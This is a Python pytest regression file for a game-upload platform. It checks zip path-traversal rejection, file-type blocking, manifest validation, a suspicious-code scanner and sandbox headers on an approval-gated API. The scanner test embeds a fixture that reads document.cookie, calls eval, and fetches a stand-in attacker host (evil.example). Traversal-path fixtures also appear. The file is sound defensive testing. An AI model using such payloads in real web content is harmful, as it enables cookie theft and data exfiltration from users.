"""游戏平台回归测试（v3.15.0）。

覆盖：zip 安全解包（穿越/非法类型拒绝）、manifest 校验、静态可疑扫描、
公共接口（列表 / 沙箱资源 + 安全响应头）与审核状态门禁。

运行：仓库根目录 `python -m pytest tests/test_games.py -q`
"""
import io
import json
import os
import shutil
import uuid
import zipfile

from models import db, Game
import games_safety as gs


def _tok():
    return uuid.uuid4().hex[:10]


def _zip_bytes(files):
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w") as z:
        for name, data in files.items():
            z.writestr(name, data)
    return bio.getvalue()


def test_unpack_rejects_traversal():
    bad = _zip_bytes({"../evil.html": "<script>x</script>"})
    try:
        gs.unpack_zip_safely(bad)
        assert False, "应拒绝穿越路径"
    except ValueError as e:
        assert "路径" in str(e)


def test_unpack_rejects_abs_and_bad_ext():
    for payload in ({"C:/evil.html": "x"}, {"game.exe": b"MZ"}, {"a.php": "<?php"}):
        try:
            gs.unpack_zip_safely(_zip_bytes(payload))
            assert False, "应拒绝：" + str(payload)
        except ValueError:
            pass


def test_unpack_ok_and_manifest():
    files = {
        "manifest.json": json.dumps({"name": "泡泡", "entry": "index.html", "author": "a"}),
        "index.html": "<html>hi</html>",
        "js/app.js": "let x=1;",
    }
    out = gs.unpack_zip_safely(_zip_bytes(files))
    assert {f["name"] for f in out} == set(files)
    man = gs.find_manifest(out)
    assert man and man["name"] == "泡泡"
    ok, _ = gs.validate_manifest(man)
    assert ok
    ok2, _ = gs.validate_manifest({"name": "x", "entry": "../o.html"})
    assert not ok2


def test_scan_flags_and_clean():
    files = [
        {"name": "ok.js", "data": b"const a=1; window.addEventListener('click',()=>{});"},
        {"name": "bad.html", "data": b"<script>document.cookie; eval('x');"
                                     b"fetch('https://evil.example/x');</script>"},
    ]
    findings, score = gs.scan_game_files(files)
    rules = {f["rule"] for f in findings}
    assert "cookie_read" in rules and "eval_ctor" in rules and "exfil_fetch" in rules
    assert score < 90
    f2, s2 = gs.scan_game_files([files[0]])
    assert s2 == 100


def test_api_gate_approval_only_and_sandbox_headers(app, client):
    tk = _tok()
    slug = "game-" + tk
    gdir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                        "myblog", "data", "games", slug)
    with app.app_context():
        try:
            os.makedirs(gdir, exist_ok=True)
            with open(os.path.join(gdir, "index.html"), "w", encoding="utf-8") as fh:
                fh.write("<!doctype html><meta charset=utf-8><script>alert(1)</script>ok")
            g = Game(slug=slug, title="T-" + tk, entry="index.html", status="pending",
                     version="1.0", audit_score=100)
            db.session.add(g)
            db.session.commit()
            # 待审：列表不含/详情/资源一律不可见
            slugs = [i["slug"] for i in client.get("/api/games").get_json()["items"]]
            assert slug not in slugs
            assert client.get(f"/api/game/{slug}").status_code == 404
            assert client.get(f"/api/game-files/{slug}/index.html").status_code == 404
            # 通过后：可见且带沙箱头
            g.status = "approved"
            db.session.commit()
            assert any(i["slug"] == slug for i in client.get("/api/games").get_json()["items"])
            r = client.get(f"/api/game-files/{slug}/index.html")
            assert r.status_code == 200
            assert r.headers.get("Content-Security-Policy", "").startswith("sandbox allow-scripts")
            assert r.headers.get("X-Content-Type-Options") == "nosniff"
            # 路径穿越被拒
            assert client.get(f"/api/game-files/{slug}/../x").status_code in (403, 404)
        finally:
            db.session.rollback()
            Game.query.filter_by(slug=slug).delete()
            db.session.commit()
            if os.path.isdir(gdir):
                shutil.rmtree(gdir, ignore_errors=True)
